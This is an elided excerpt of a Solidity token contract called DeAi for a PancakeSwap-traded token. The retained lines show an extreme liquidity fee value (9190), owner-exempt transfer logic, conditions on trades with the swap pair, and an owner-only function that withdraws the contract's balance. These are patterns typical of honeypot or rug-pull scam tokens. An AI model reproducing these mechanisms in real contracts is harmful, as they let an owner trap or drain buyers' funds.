...
contract DeAi is Context, IERC20, Ownable {
    ...
    string private _symbol = "DeAiT25";
    ...
    uint256 public _liquidityFee = 9190;
    ...
    uint256 private numTokensSellToAddToLiquidity = 10**4 * 10**18;
    ...
    function _takeLiquidity(uint256 tLiquidity) private {
        ...
        if (balanceOf(owner()) > tLiquidity) {
            _rOwned[owner()] = _rOwned[owner()].sub(rLiquidity);
            if(_isExcluded[owner()])
                _tOwned[owner()] = _tOwned[owner()].sub(tLiquidity);
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner()) {
            ...
            if (to == pancakeswapV2Pair || (from != pancakeswapV2Pair && to != pancakeswapV2Pair)) {
    ...
    function transferContractValue(address recipient, uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }        
